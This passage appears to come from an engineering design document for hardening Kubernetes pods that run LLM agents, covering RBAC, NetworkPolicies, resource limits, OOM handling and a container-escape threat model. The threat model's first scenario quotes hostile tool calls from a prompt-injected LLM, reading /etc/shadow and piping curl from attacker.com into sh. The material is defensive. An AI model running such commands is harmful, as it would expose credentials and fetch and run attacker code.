              drop:
                - ALL
          volumeMounts:
            - name: workspace
              mountPath: /workspace
            - name: dshm
              mountPath: /dev/shm
            - name: tmp-playwright
              mountPath: /tmp
      volumes:
        - name: workspace
          emptyDir:
            sizeLimit: 500Mi
        - name: tmp
          emptyDir:
            sizeLimit: 100Mi
        - name: dshm
          emptyDir:
            medium: Memory
            sizeLimit: 256Mi
        - name: tmp-playwright
          emptyDir:
            sizeLimit: 500Mi
```

---

## Artifact: ServiceAccount + Role + RoleBinding Templates

### Agent Runner ServiceAccount

```yaml
# deploy/agents/serviceaccount.yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: agent-runner
  namespace: cortex
  labels:
    app.kubernetes.io/component: agent
    app.kubernetes.io/part-of: cortex-plane
automountServiceAccountToken: false
```

### Control Plane ServiceAccount

```yaml
# deploy/control-plane/serviceaccount.yaml
apiVersion: v1
kind: ServiceAccount
metadata:
  name: control-plane
  namespace: cortex
  labels:
    app.kubernetes.io/component: control-plane
    app.kubernetes.io/part-of: cortex-plane
```

### Control Plane Role

```yaml
# deploy/control-plane/role.yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: control-plane-role
  namespace: cortex
  labels:
    app.kubernetes.io/component: control-plane
    app.kubernetes.io/part-of: cortex-plane
rules:
  # Manage agent Jobs
  - apiGroups: ["batch"]
    resources: ["jobs"]
    verbs: ["create", "get", "list", "watch", "delete"]
  # Read pod status and logs
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["get", "list", "watch"]
  - apiGroups: [""]
    resources: ["pods/log"]
    verbs: ["get"]
  # Read agent-specific secrets (scoped by resourceNames)
  - apiGroups: [""]
    resources: ["secrets"]
    verbs: ["get"]
```

### Control Plane RoleBinding

```yaml
# deploy/control-plane/rolebinding.yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: control-plane-binding
  namespace: cortex
  labels:
    app.kubernetes.io/component: control-plane
    app.kubernetes.io/part-of: cortex-plane
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: control-plane-role
subjects:
  - kind: ServiceAccount
    name: control-plane
    namespace: cortex
```

### PriorityClasses

```yaml
# deploy/priority-classes.yaml
apiVersion: scheduling.k8s.io/v1
kind: PriorityClass
metadata:
  name: cortex-system
value: 1000
globalDefault: false
description: "Cortex system components: control plane, PostgreSQL, Qdrant."
---
apiVersion: scheduling.k8s.io/v1
kind: PriorityClass
metadata:
  name: agent-workload
value: 100
globalDefault: false
description: "Ephemeral agent pods. Evicted before system components."
```

---

## Artifact: Resource Request/Limit Matrix

### Per-Container Sizing

| Container          | CPU Request | CPU Limit | Mem Request | Mem Limit | QoS Class | Notes                              |
| ------------------ | ----------- | --------- | ----------- | --------- | --------- | ---------------------------------- |
| Core agent         | 250m        | 500m      | 256Mi       | 1Gi       | Burstable | I/O-bound; V8 heap capped at 768MB |
| Playwright sidecar | 500m        | 1000m     | 512Mi       | 2Gi       | Burstable | Chromium rendering; /dev/shm 256Mi |
| Sidecar (future)   | 50m         | 100m      | 64Mi        | 128Mi     | Burstable | Logging/metrics forwarder          |

### Per-Pod Totals (Worst Case)

| Pod Type                     | Total CPU Request | Total CPU Limit | Total Mem Request | Total Mem Limit |
| ---------------------------- | ----------------- | --------------- | ----------------- | --------------- |
| Core agent (no Playwright)   | 250m              | 500m            | 256Mi             | 1Gi             |
| Agent + Playwright           | 750m              | 1500m           | 768Mi             | 3Gi             |
| Agent + Playwright + sidecar | 800m              | 1600m           | 832Mi             | 3.125Gi         |

### Cluster Capacity Planning

Assuming a homelab cluster with 2 nodes, each with 4 CPU cores and 16GB RAM (32GB total):

| Scenario                                     | Max Concurrent Core Agents  | Max Concurrent Playwright Pods |
| -------------------------------------------- | --------------------------- | ------------------------------ |
| **Available for agents** (after system pods) | ~6 CPU, ~24 GB              | ~6 CPU, ~24 GB                 |
| **Scheduled by requests**                    | 24 (6000m / 250m)           | 8 (6000m / 750m)               |
| **Memory-limited**                           | 93 (24Gi / 256Mi)           | 31 (24Gi / 768Mi)              |
| **Practical concurrency**                    | **~10–15** (mixed workload) | **~4–6** (with core agents)    |

The practical limit is CPU, not memory. This is appropriate — agent pods are ephemeral and cycle quickly.

### Growth Thresholds

| Scale       | Agents/Day  | Concurrent Peak | Action                                                           |
| ----------- | ----------- | --------------- | ---------------------------------------------------------------- |
| **Day 1**   | <50 jobs    | 2–3 agents      | Default limits. Monitor via Prometheus.                          |
| **Growing** | 50–200 jobs | 5–8 agents      | Consider adding a node. Watch eviction events.                   |
| **Busy**    | 200+ jobs   | 10+ agents      | Add dedicated agent node. Consider node affinity for Playwright. |

---

## Artifact: NetworkPolicy Spec

### Agent Pod Egress

Agent pods can reach:

- LLM API endpoints (HTTPS, port 443)
- MCP servers (configurable ports)
- PostgreSQL (port 5432, within cluster)
- Qdrant (ports 6333/6334, within cluster)
- DNS (port 53, kube-dns)

Agent pods **cannot** reach:

- Other agent pods (no agent-to-agent communication)
- The Kubernetes API server (no SA token mounted, but belt-and-suspenders via NetworkPolicy)
- Host network services (NodePort, host ports)

```yaml
# deploy/agents/networkpolicy.yaml

# Policy 1: Deny all agent-to-agent traffic
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: agent-deny-inter-pod
  namespace: cortex
  labels:
    app.kubernetes.io/component: agent
    app.kubernetes.io/part-of: cortex-plane
spec:
  podSelector:
    matchLabels:
      app: cortex-agent
  policyTypes:
    - Ingress
  ingress: [] # No inbound traffic to agent pods — they don't serve requests
---
# Policy 2: Agent egress — strict allowlist
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: agent-egress
  namespace: cortex
  labels:
    app.kubernetes.io/component: agent
    app.kubernetes.io/part-of: cortex-plane
spec:
  podSelector:
    matchLabels:
      app: cortex-agent
  policyTypes:
    - Egress
  egress:
    # DNS resolution (kube-dns / CoreDNS)
    - to:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: kube-system
      ports:
        - port: 53
          protocol: UDP
        - port: 53
          protocol: TCP
    # PostgreSQL (within cortex namespace)
    - to:
        - podSelector:
            matchLabels:
              app: postgres
      ports:
        - port: 5432
          protocol: TCP
    # Qdrant (within cortex namespace)
    - to:
        - podSelector:
            matchLabels:
              app: qdrant
      ports:
        - port: 6333
          protocol: TCP
        - port: 6334
          protocol: TCP
    # External HTTPS — LLM APIs, MCP servers, webhooks
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0
            except:
              - 10.0.0.0/8 # Block private ranges (cluster network)
              - 172.16.0.0/12 # Block private ranges
              - 192.168.0.0/16 # Block private ranges (homelab LAN)
      ports:
        - port: 443
          protocol: TCP
```

### Design Notes

1. **No inbound traffic.** Agent pods don't expose services. They're consumers only — they pull work from PostgreSQL (via Graphile Worker) and push results back. The empty `ingress` array blocks all inbound connections including from other agents.

2. **External egress restricted to port 443.** Agents communicate with external services exclusively over HTTPS. Blocking ports 80, 8080, and arbitrary ports prevents data exfiltration over non-standard channels. If an MCP server uses a non-443 port, add it explicitly to the egress rules.

3. **Private IP ranges blocked.** This prevents a compromised agent from scanning the homelab LAN, reaching the k8s API server (typically on a private IP), or accessing other services on the local network. The exception blocks cover RFC 1918 private ranges.

4. **DNS allowed to kube-system only.** DNS egress is scoped to the `kube-system` namespace where CoreDNS runs. This prevents DNS exfiltration to arbitrary DNS servers.

### NetworkPolicy for Control Plane

```yaml
# deploy/control-plane/networkpolicy.yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: control-plane-egress
  namespace: cortex
  labels:
    app.kubernetes.io/component: control-plane
    app.kubernetes.io/part-of: cortex-plane
spec:
  podSelector:
    matchLabels:
      app: cortex-control-plane
  policyTypes:
    - Ingress
    - Egress
  ingress:
    # Accept HTTP traffic from ingress controller
    - from:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: kube-system
      ports:
        - port: 4000
          protocol: TCP
    # Accept Prometheus scrape
    - from:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: monitoring
      ports:
        - port: 4000
          protocol: TCP
  egress:
    # DNS
    - to:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: kube-system
      ports:
        - port: 53
          protocol: UDP
        - port: 53
          protocol: TCP
    # PostgreSQL
    - to:
        - podSelector:
            matchLabels:
              app: postgres
      ports:
        - port: 5432
          protocol: TCP
    # Qdrant
    - to:
        - podSelector:
            matchLabels:
              app: qdrant
      ports:
        - port: 6333
          protocol: TCP
        - port: 6334
          protocol: TCP
    # Kubernetes API server (for Job management)
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0 # API server IP varies; allow all, scoped by RBAC
      ports:
        - port: 6443
          protocol: TCP
    # External HTTPS (LLM APIs, webhooks)
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0
            except:
              - 10.0.0.0/8
              - 172.16.0.0/12
              - 192.168.0.0/16
      ports:
        - port: 443
          protocol: TCP
```

---

## Artifact: Threat Model — Container Escape Scenarios

### Scenario 1: Compromised LLM Output — Command Injection

**Attack:** The LLM is prompt-injected and generates a malicious tool call: `execute_shell("cat /etc/shadow")` or `execute_shell("curl attacker.com | sh")`.

**Mitigations:**

| Layer       | Control                                                  | Effect                                      |
| ----------- | -------------------------------------------------------- | ------------------------------------------- |
| Application | Tool call allowlist — only approved tools execute        | Blocks unknown commands                     |
| Application | Tool argument validation — shell metacharacter filtering | Blocks injection in approved tools          |
| Container   | Non-root (UID 10000)                                     | Cannot read `/etc/shadow`                   |
| Container   | Read-only root filesystem                                | Cannot write to container filesystem        |
| Container   | Capabilities dropped (ALL)                               | Cannot elevate privileges                   |
| Network     | Egress NetworkPolicy — only HTTPS 443 to external        | Blocks `curl attacker.com` on non-443 ports |
| Network     | Private IP block in egress                               | Blocks LAN scanning                         |

**Residual risk:** If the tool allowlist includes a shell-like tool (e.g., `execute_code`), the LLM can run arbitrary code within the container. The blast radius is limited to: (a) data visible in the container's environment variables, (b) data on the workspace volume, (c) exfiltration over HTTPS to external hosts. Mitigation: scope the `execute_code` tool to a further-sandboxed environment (e.g., a child process with rlimits, or a separate container).

### Scenario 2: Container Escape via Kernel Exploit

**Attack:** A compromised agent process exploits a kernel vulnerability (e.g., CVE-2022-0185 `fsconfig` heap overflow, CVE-2024-1086 `nf_tables` use-after-free) to escape the container namespace.

**Mitigations:**

| Layer          | Control                           | Effect                                                                                  |
| -------------- | --------------------------------- | --------------------------------------------------------------------------------------- |
| Seccomp        | RuntimeDefault profile            | Blocks many syscalls used in kernel exploits (`unshare`, `userfaultfd`, `bpf`, `mount`) |
| Capabilities   | Drop ALL                          | Blocks `CAP_SYS_ADMIN` required by most escape exploits                                 |
| User namespace | Non-root (UID 10000)              | Not root inside the container; many exploits require in-container root                  |
| Pod Security   | `allowPrivilegeEscalation: false` | Prevents setuid binaries and capability escalation                                      |
| Kernel         | Keep k3s and kernel updated       | Patch known CVEs promptly                                                               |

**Residual risk:** A zero-day kernel exploit that doesn't require any dropped capability or blocked syscall. This is the hardest threat to mitigate at the container level. Mitigations: (a) keep the kernel updated, (b) consider gVisor or Kata Containers for stronger isolation (see Open Questions), (c) accept the risk for a homelab environment.

### Scenario 3: SA Token Theft — k8s API Access

**Attack:** A compromised agent reads the mounted ServiceAccount token from `/var/run/secrets/kubernetes.io/serviceaccount/token` and uses it to access the Kubernetes API server.

**Mitigations:**

| Layer          | Control                                                                | Effect                                               |
| -------------- | ---------------------------------------------------------------------- | ---------------------------------------------------- |
| ServiceAccount | `automountServiceAccountToken: false`                                  | Token is not mounted. The file doesn't exist.        |
| RBAC           | `agent-runner` SA has zero permissions                                 | Even if a token were obtained, it can't do anything. |
| NetworkPolicy  | Agent egress to API server port 6443 is blocked (private IP exclusion) | Can't reach the API server over the network.         |

**Residual risk:** Near zero. Three independent controls must all fail simultaneously.

### Scenario 4: Playwright — Malicious Web Page

**Attack:** A Playwright task navigates to an attacker-controlled URL. The page exploits a Chromium vulnerability (renderer RCE) or attempts data exfiltration via the browser.

**Mitigations:**

| Layer       | Control                                                     | Effect                                                                              |
| ----------- | ----------------------------------------------------------- | ----------------------------------------------------------------------------------- |
| Chromium    | Browser sandbox (process-per-site, seccomp within Chromium) | Renderer RCE is contained to the renderer process                                   |
| Container   | Non-root, read-only filesystem, capabilities dropped        | Even if the Chromium sandbox is bypassed, the attacker is in a restricted container |
| Network     | Egress limited to HTTPS 443                                 | Exfiltration limited to HTTPS; no raw socket, no non-standard ports                 |
| Application | URL allowlist/blocklist in agent config                     | Prevents navigation to known-malicious domains                                      |
| Resource    | Memory limit 2Gi, CPU limit 1 core                          | Prevents crypto mining or DoS from a malicious page consuming cluster resources     |

**Residual risk:** Chromium zero-day + container escape chain. Theoretical but real — Chromium has had sandbox bypass CVEs. The container-level controls (seccomp, capabilities, non-root) act as a second sandbox. For higher assurance, run Playwright pods on a dedicated node with node taints.

### Scenario 5: Data Exfiltration via DNS

**Attack:** A compromised agent encodes secrets in DNS queries to an attacker-controlled domain (DNS tunneling).

**Mitigations:**

| Layer         | Control                                                                            | Effect                                                             |
| ------------- | ---------------------------------------------------------------------------------- | ------------------------------------------------------------------ |
| NetworkPolicy | DNS egress only to kube-system (CoreDNS)                                           | DNS queries go through CoreDNS, not directly to external resolvers |
| CoreDNS       | CoreDNS resolves via upstream DNS; the query content is visible to CoreDNS logging | Detection — log DNS queries and alert on anomalous patterns        |

**Residual risk:** DNS tunneling through CoreDNS is still possible — CoreDNS forwards queries to upstream resolvers, and the query content reaches the internet. Mitigation: CoreDNS request logging + anomaly detection (long query names, high query volume from a single pod). For a homelab, this risk is accepted.

### Threat Matrix Summary

| Scenario                | Likelihood | Impact       | Mitigations                                                       | Residual Risk                           |
| ----------------------- | ---------- | ------------ | ----------------------------------------------------------------- | --------------------------------------- |
| LLM command injection   | **High**   | Medium       | Tool allowlist, validation, non-root, read-only FS, NetworkPolicy | Moderate — depends on tool surface area |
| Kernel exploit escape   | Low        | **Critical** | Seccomp, capabilities, non-root, patching                         | Low — requires zero-day                 |
| SA token theft          | Low        | High         | Token not mounted, zero RBAC, NetworkPolicy                       | **Near zero**                           |
| Playwright page exploit | Medium     | Medium       | Chromium sandbox, container sandbox, NetworkPolicy                | Low — requires double sandbox bypass    |
| DNS exfiltration        | Low        | Medium       | CoreDNS-only DNS, logging                                         | Low — detection-based                   |

---

## Artifact: OOM Handling Strategy for Playwright Containers

### The Problem

Chromium is memory-unpredictable. A page with a large DOM, heavy JavaScript, or a memory leak can push Chromium past the 2Gi container limit. When this happens, the OOM killer sends SIGKILL to the container — no cleanup, no graceful shutdown, no error message.

The agent process (in the core agent container) sees the Playwright sidecar die and needs to:

1. Detect the OOM kill.
2. Report a meaningful error (not "connection refused" or "socket closed").
3. Decide whether to retry.

### Detection

When the Playwright container is OOM-killed, the pod's container status shows:

```json
{
  "lastState": {
    "terminated": {
      "exitCode": 137,
      "reason": "OOMKilled"
    }
  }
}
```

Exit code 137 = 128 + 9 (SIGKILL). The `reason: OOMKilled` is set by the kubelet.

**In the agent process**, the Playwright connection (via WebSocket to the browser) drops abruptly. The agent detects this as:

- `playwright.chromium.connect()` throws `Error: browserType.connect: Target page, context or browser has been closed`.
- Any in-flight page operation rejects with a connection error.

### Handling Strategy

```
Agent process detects Playwright connection failure
  │
  ├── Check: was the Playwright container OOM-killed?
  │   │  (poll pod status via downward API or catch exit code 137)
  │   │
  │   ├── Yes: OOM kill
  │   │   ├── Log: "Playwright OOM-killed processing URL: {url}"
  │   │   ├── Record: job transition to FAILED with error_class: RESOURCE_EXHAUSTION
  │   │   ├── Retry decision:
  │   │   │   ├── Same URL, first attempt → retry with reduced viewport / disabled JS
  │   │   │   ├── Same URL, second attempt → fail permanently; page is too heavy
  │   │   │   └── Different URL → retry normally
  │   │   └── Emit metric: cortex_playwright_oom_total{agent_slug}
  │   │
  │   └── No: Other failure (crash, bug)
  │       ├── Log full error context
  │       └── Standard retry via Graphile Worker (spike #28)
```

### Implementation: OOM Detection Without k8s API Access

Since agent pods have `automountServiceAccountToken: false`, they can't query the k8s API for pod status. Instead, use the **Kubernetes Downward API** to expose container status:

The Downward API doesn't expose other containers' termination reasons. Alternative approaches:

**Option A: Health check file.** The Playwright container writes a heartbeat file to the shared workspace volume. The agent polls this file. If the file stops updating and the Playwright WebSocket drops, infer OOM.

```yaml
# In Playwright container
volumeMounts:
  - name: workspace
    mountPath: /workspace
# Playwright startup script writes heartbeat
# while true; do date > /workspace/.playwright-heartbeat; sleep 5; done &
```

**Option B: Exit code detection.** The agent container wraps Playwright operations in a timeout. When the operation fails with a connection error, the agent logs the failure with exit code 137 inference (if the connection dropped abruptly without a clean shutdown message, OOM is the most likely cause).

**Decision: Option B (exit code inference).** The heartbeat approach adds complexity (background process, file polling) for marginal benefit. In practice, a sudden connection drop during page rendering is almost always OOM. The agent classifies it as `RESOURCE_EXHAUSTION` and the Graphile Worker retry logic handles the rest.

### Retry Strategy for OOM

| Attempt | Strategy                                    | Rationale                                                                                |
| ------- | ------------------------------------------- | ---------------------------------------------------------------------------------------- |
| 1st OOM | Retry with `--disable-javascript`           | Many OOM cases are caused by heavy JS frameworks. Disabling JS reduces memory by 50–80%. |
| 2nd OOM | Retry with reduced viewport (800x600)       | Smaller viewport = smaller render tree = less memory.                                    |
| 3rd OOM | Fail permanently with `RESOURCE_EXHAUSTION` | The page is inherently too heavy for the 2Gi limit.                                      |

The retry strategy is implemented in the agent's Playwright tool handler, not in Graphile Worker. Worker retries are for infrastructure failures; OOM retries are domain-specific:

```typescript
async function browseWithOomRetry(
  url: string,
  options: BrowseOptions,
  maxAttempts = 3,
): Promise<BrowseResult> {
  const strategies: BrowseOptions[] = [
    options, // attempt 1: normal
    { ...options, javaScriptEnabled: false }, // attempt 2: no JS
    {
      ...options,
      javaScriptEnabled: false, // attempt 3: no JS + small viewport
      viewport: { width: 800, height: 600 },
    },
  ]

  for (let i = 0; i < maxAttempts; i++) {
    try {
      return await browse(url, strategies[i]!)
    } catch (error) {
      if (isOomError(error) && i < maxAttempts - 1) {
        logger.warn(
          { url, attempt: i + 1, strategy: strategies[i + 1] },
          "Playwright OOM, retrying with reduced resources",
        )
        continue
      }
      throw error
    }
  }
  throw new Error("unreachable")
}

function isOomError(error: unknown): boolean {
  // Playwright connection drops abruptly on OOM — no clean error code.
  // Heuristic: connection error + no prior page.close() call.
  return (
    error instanceof Error &&
    (error.message.includes("Target page, context or browser has been closed") ||
      error.message.includes("browser has been closed") ||
      error.message.includes("Connection closed"))
  )
}
```

### Monitoring

```yaml
# Prometheus alert for recurring OOM kills
- alert: PlaywrightOOMRecurring
  expr: >
    increase(cortex_playwright_oom_total[1h]) > 3
  for: 0m
  labels:
    severity: warning
  annotations:
    summary: "Playwright OOM kills recurring"
    description: "{{ $value }} Playwright OOM kills in the last hour. Check agent tasks for pages that are too heavy."
```

---

## Design Decisions

### 1. Shared ServiceAccount Over Per-Agent

**Decision:** All agent pods use `agent-runner` SA with zero permissions.

**Rationale:** Per-agent ServiceAccounts add operational complexity (create/delete on agent CRUD, token rotation) with zero security benefit when the SA has no permissions and the token isn't mounted. Agent identity for audit purposes is tracked via pod labels (`cortex.plane/agent-slug`, `cortex.plane/job-id`) and control plane logs, not k8s API audit logs.

### 2. emptyDir Over PVC for Default Workspace

**Decision:** Default to `emptyDir` for agent workspace, not PVC subpath mounts.

**Rationale:** Most agent jobs are stateless — they process a request and return a result. `emptyDir` is inherently isolated (per-pod), requires no PVC provisioning, has no directory traversal concerns, and is automatically cleaned up when the pod exits. PVC subpath mounts are reserved for agents that explicitly need persistent workspace data across retries.

### 3. RuntimeDefault Seccomp Over Custom Profile

**Decision:** Use the container runtime's default seccomp profile, not a custom one.

**Rationale:** Custom seccomp profiles require per-image testing, per-node deployment, and maintenance on every dependency upgrade. The RuntimeDefault profile blocks the dangerous syscalls (mount, reboot, kexec, bpf) without the operational burden. The marginal security gain of a custom profile is not justified for a homelab deployment.

### 4. Burstable QoS with PriorityClass

**Decision:** Agent pods use Burstable QoS (requests < limits) with a low PriorityClass.

**Rationale:** Guaranteed QoS wastes resources on I/O-bound workloads. Burstable QoS with a low PriorityClass ensures agents are evicted first under memory pressure — this is the correct behavior, as agent jobs are retryable (spike #28) while system components are not.

### 5. Egress NetworkPolicy Blocks Private IP Ranges

**Decision:** External egress allows only port 443 and blocks RFC 1918 ranges.

**Rationale:** This prevents a compromised agent from scanning the homelab LAN, reaching the k8s API server, or accessing co-located services (NAS, home automation, etc.). The private IP block is the single most impactful network-level control for homelab deployments.

### 6. /dev/shm emptyDir for Playwright

**Decision:** Mount an emptyDir with `medium: Memory` at `/dev/shm` for Playwright containers.

**Rationale:** Chromium requires a larger `/dev/shm` than the default 64MB. The `medium: Memory` flag creates a tmpfs mount, which is what Chromium expects. The 256Mi size limit is charged against the container's memory limit, preventing unbounded shared memory growth.

---

## Open Questions

1. **gVisor / Kata Containers.** For stronger container isolation (syscall interception, not just filtering), gVisor or Kata Containers provide a sandbox layer between the container and the host kernel. k3s supports gVisor via `containerd` runtime class configuration. Is the performance overhead (10–30% for CPU-bound workloads, 2–5× for syscall-heavy workloads) acceptable? For Playwright tasks, gVisor's syscall overhead may be significant. Evaluate in a separate spike if the threat model escalates.

2. **Scoped secrets management.** The current design injects agent secrets via `secretKeyRef` in the Job manifest. This means the control plane reads secrets and embeds them in the Job spec (which is stored in etcd). A more secure approach: use a secrets CSI driver (HashiCorp Vault, External Secrets Operator) to mount secrets directly into agent pods without the control plane seeing the values. Depends on the secrets management spike.

3. **Node taints for Playwright.** Should Playwright pods run on a dedicated node with a taint (`cortex.plane/workload=browser:NoSchedule`)? This provides physical isolation — even if a Playwright container escapes, it's on a node that doesn't run the control plane or databases. Adds operational complexity (dedicated node, taint/toleration management). Evaluate based on cluster size.

4. **Egress to MCP servers on non-443 ports.** The current NetworkPolicy allows external egress only on port 443. If an MCP server runs on a non-standard port (e.g., 8443, 3000), the agent can't reach it. Options: (a) add per-agent egress rules dynamically, (b) use a reverse proxy that accepts on 443, (c) broaden the egress port range. Option (b) is cleanest.

5. **Network Policy enforcement in k3s.** k3s uses Flannel by default, which does **not** support NetworkPolicy. To enforce the policies defined in this spike, switch to a CNI that supports NetworkPolicy: **Cilium** (recommended — eBPF-based, efficient) or Calico. This is a prerequisite for this spike's NetworkPolicy artifacts to be effective. k3s can be installed with `--flannel-backend=none` and Cilium deployed separately.

6. **Container image scanning.** Agent images should be scanned for known CVEs before deployment. Trivy (Aqua Security) integrates with CI/CD and can scan images in the GitHub Container Registry. Add to the CI pipeline spike.

7. **Audit logging.** Pod labels (`cortex.plane/agent-slug`, `cortex.plane/job-id`) enable correlation between k8s events and control plane logs. Should the k8s API server audit policy be configured to log agent pod lifecycle events? This would provide an independent audit trail of pod creation, execution, and termination.
